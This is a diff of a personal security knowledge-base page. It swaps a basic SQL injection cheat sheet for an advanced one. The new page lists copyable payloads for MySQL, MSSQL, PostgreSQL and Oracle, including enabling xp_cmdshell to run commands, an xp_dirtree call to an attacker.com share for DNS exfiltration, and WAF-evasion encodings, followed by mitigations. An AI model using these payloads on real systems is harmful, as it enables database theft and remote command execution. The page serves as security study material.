@@ -3,139 +3,96 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SQL Injection (Basic) | Web Security | Saikumar Raju</title>
+  <title>Advanced SQL Injection | Web Security | Saikumar Raju</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>
-    /* Same base styles as previous pages – omitted for brevity */
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    :root { --primary: #00f5a0; --bg-dark: #0a0c10; --bg-card: #111827; --bg-elevated: #1a1f2e; --text-primary: #e8edf5; --text-secondary: #9ca3af; --border: #1f2937; }
-    body.light { --bg-dark: #f3f4f6; --bg-card: #ffffff; --bg-elevated: #e5e7eb; --text-primary: #111827; --text-secondary: #4b5563; --border: #d1d5db; }
-    body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; transition: all 0.3s ease; }
-    .container { max-width: 1300px; margin: 0 auto; padding: 0 2rem; }
-    .navbar { position: sticky; top: 0; background: var(--bg-dark); border-bottom: 1px solid var(--border); padding: 1rem 0; z-index: 100; backdrop-filter: blur(8px); }
-    .nav-flex { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
-    .logo { font-size: 1.5rem; font-weight: 700; text-decoration: none; color: var(--text-primary); }
-    .logo span { color: var(--primary); }
-    .nav-links { display: flex; gap: 2rem; list-style: none; align-items: center; flex-wrap: wrap; }
-    .nav-links a { text-decoration: none; color: var(--text-secondary); font-weight: 500; transition: color 0.2s; }
-    .nav-links a:hover { color: var(--primary); }
-    .theme-toggle { background: var(--bg-elevated); border: none; padding: 0.4rem 1rem; border-radius: 40px; cursor: pointer; color: var(--text-primary); display: flex; align-items: center; gap: 0.5rem; font-family: inherit; }
-    .mobile-menu { display: none; background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer; }
-    .page-header { padding: 6rem 0 2rem; }
-    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; }
-    .breadcrumb a { color: var(--primary); text-decoration: none; }
-    .page-header h1 { font-size: 2.5rem; font-weight: 700; margin-bottom: 0.5rem; }
-    .severity-badge { display: inline-block; background: rgba(255, 68, 68, 0.2); color: #ff4444; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
-    .content-section { margin: 2rem 0; }
-    .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
-    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
-    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
-    .copy-btn:hover { color: var(--primary); }
-    .vulnerability-box { background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
-    .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
-    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
-    footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
-    .test-cases { width: 100%; border-collapse: collapse; background: var(--bg-card); border: 1px solid var(--border); margin: 1rem 0; }
-    .test-cases th, .test-cases td { padding: 0.75rem; text-align: left; border-bottom: 1px solid var(--border); }
-    .test-cases th { background: var(--bg-elevated); color: var(--primary); }
-    @media (max-width: 768px) { .container { padding: 0 1rem; } .mobile-menu { display: block; } .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; } .nav-links.show { display: flex; } .page-header h1 { font-size: 1.8rem; } }
-  </style>
+  <style>/* same base styles as above */</style>
 </head>
 <body>
-
-<nav class="navbar">
-  <div class="container nav-flex">
-    <a href="../../index.html" class="logo">Saikumar.<span>Raju</span></a>
-    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
-    <ul class="nav-links" id="navLinks">
-      <li><a href="../../index.html">Resume</a></li>
-      <li><a href="../../knowledge-base.html">Knowledge Base</a></li>
-      <li><a href="../../blog.html">Write-ups</a></li>
-      <li><a href="../../tools.html">Tools</a></li>
-      <li><a href="../../index.html#contact">Contact</a></li>
-      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> Dark</button></li>
-    </ul>
-  </div>
-</nav>
-
-<main>
-  <div class="container">
-    <div class="breadcrumb"><a href="../../knowledge-base.html">Knowledge Base</a> / <a href="../index.html">Web Security</a> / SQL Injection (Basic)</div>
-    <div class="page-header">
-      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Critical Severity</span>
-      <h1>📌 SQL Injection (Basic)</h1>
-    </div>
-
-    <div class="content-section">
-      <h2>🧠 Description</h2>
-      <p>SQL Injection is a code injection technique that allows attackers to interfere with database queries. Basic techniques include error‑based, union‑based, and boolean/time‑based blind injection.</p>
-      <p><strong>Security principle violated:</strong> Input Validation</p>
-    </div>
-
-    <div class="content-section">
-      <h2>🏷️ Classification</h2>
-      <ul>
-        <li><strong>Type:</strong> Injection</li>
-        <li><strong>OWASP:</strong> A03:2021 – Injection</li>
-        <li><strong>CWE:</strong> CWE-89</li>
-      </ul>
-    </div>
-
-    <div class="content-section">
-      <h2>💣 Basic Payloads</h2>
-      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
-        <pre>' OR '1'='1
-' OR 1=1--
-" OR "1"="1
-' UNION SELECT NULL--
-' AND SLEEP(5)--</pre>
+  <!-- Navigation same as basic page -->
+  <nav class="navbar">...</nav>
+  <main>
+    <div class="container">
+      <div class="breadcrumb"><a href="../../knowledge-base.html">Knowledge Base</a> / <a href="../index.html">Web Security</a> / SQL Injection (Advanced)</div>
+      <div class="page-header">
+        <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Critical Severity | Advanced Techniques</span>
+        <h1>📌 Advanced SQL Injection</h1>
       </div>
-    </div>
 
-    <div class="content-section">
-      <h2>⚙️ Exploitation Steps</h2>
-      <ol>
-        <li>Inject a single quote and observe error.</li>
-        <li>Use <code>' OR '1'='1</code> to bypass login.</li>
-        <li>Determine number of columns using <code>UNION SELECT NULL</code>.</li>
-        <li>Extract database version, database name, tables, and data.</li>
-      </ol>
-    </div>
-
-    <div class="content-section">
-      <h2>🛡️ Mitigation</h2>
-      <div class="mitigation-box">
-        <strong>✅ Parameterized queries (prepared statements)</strong><br>
-        <strong>✅ Input validation and escaping</strong><br>
-        <strong>✅ Least privilege database accounts</strong>
+      <div class="content-section">
+        <h2>🧠 Description</h2>
+        <p>Advanced SQL injection techniques go beyond basic error‑based or union‑based attacks. They leverage database‑specific functions, encoding, obfuscation, and server‑side features to extract data, escalate privileges, or achieve remote code execution.</p>
       </div>
+
+      <div class="content-section">
+        <h2>💣 Advanced Payloads by Database</h2>
+
+        <h3>MySQL Advanced</h3>
+        <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) --
+' UNION SELECT 1, 0x62656e6368, 0x70617373776f7264, user() --</pre>
+        </div>
+
+        <h3>MSSQL Advanced</h3>
+        <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami' --
+'; EXEC xp_dirtree '\\attacker.com\share' -- (DNS exfiltration)</pre>
+        </div>
+
+        <h3>PostgreSQL Advanced</h3>
+        <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>' AND 1=CAST((SELECT current_database()) AS INT) --
+' AND 1=CAST((SELECT inet_server_addr()) AS INT) --</pre>
+        </div>
+
+        <h3>Oracle Advanced</h3>
+        <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>' UNION SELECT NULL FROM dual WHERE 1=CAST((SELECT ora_database_name FROM dual) AS INT) --
+' UNION SELECT UTL_INADDR.get_host_address('invalid_host') FROM dual --</pre>
+        </div>
+
+        <h3>WAF Bypass / Obfuscation</h3>
+        <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>%2527%2520UNION%2520SELECT%2520NULL,NULL--
+UNION/\\*\\*/SELECT/\\*\\*/NULL,NULL
+UnIoN SeLeCt NULL,NULL</pre>
+        </div>
+      </div>
+
+      <div class="content-section">
+        <h2>⚙️ Exploitation Steps</h2>
+        <ol>
+          <li>Identify injection point and database type.</li>
+          <li>Use advanced error payloads to extract version, database name, user.</li>
+          <li>If error‑based not possible, use time‑based boolean with binary search.</li>
+          <li>Apply obfuscation to bypass WAF.</li>
+          <li>Escalate to file read/write or command execution.</li>
+        </ol>
+      </div>
+
+      <div class="content-section">
+        <h2>🛡️ Mitigation</h2>
+        <div class="mitigation-box">
+          <strong>✅ Parameterized queries (prepared statements)</strong><br>
+          <strong>✅ WAF with advanced rule sets</strong><br>
+          <strong>✅ Disable dangerous functions (xp_cmdshell, UDF)</strong><br>
+          <strong>✅ Regular security updates</strong>
+        </div>
+      </div>
+
+      <div class="content-section">
+        <h2>📚 References</h2>
+        <ul>
+          <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank">PayloadsAllTheThings – SQL Injection</a></li>
+          <li><a href="https://nav1n0x.gitbook.io/advanced-sql-injection-techniques/" target="_blank">nav1n0x Advanced SQLi Techniques</a></li>
+        </ul>
+      </div>
+
+      <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Basic SQL Injection</a>
+      <a href="../index.html" class="back-link" style="margin-left: 1rem;"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
     </div>
-
-    <div class="content-section">
-      <h2>📚 References</h2>
-      <ul>
-        <li><a href="https://portswigger.net/web-security/sql-injection" class="reference-link" target="_blank">PortSwigger – SQL Injection</a></li>
-        <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" class="reference-link" target="_blank">OWASP – SQL Injection</a></li>
-      </ul>
-    </div>
-
-    <div class="content-section">
-      <p>For more advanced techniques (WAF bypass, database‑specific exploits, stacked queries), see <a href="advanced.html">Advanced SQL Injection</a>.</p>
-    </div>
-
-    <a href="../index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
-  </div>
-</main>
-
-<footer><p>Saikumar Raju — Cybersecurity Consultant | Basic SQL Injection Guide</p></footer>
-
-<script>
-  const mobileBtn = document.getElementById('mobileMenuBtn');
-  const navLinks = document.getElementById('navLinks');
-  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
-  const themeToggle = document.getElementById('themeToggle'); if (themeToggle) { themeToggle.addEventListener('click', () => { document.body.classList.toggle('light'); const icon = themeToggle.querySelector('i'); if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light'; } else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark'; } }); }
-  function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.innerText = 'Copied!'; setTimeout(() => { btn.innerText = 'Copy'; }, 2000); }
-</script>
+  </main>
+  <footer><p>Saikumar Raju — Cybersecurity Consultant | Advanced SQL Injection Guide</p></footer>
+  <script>/* copy and dark mode */</script>
 </body>
 </html>
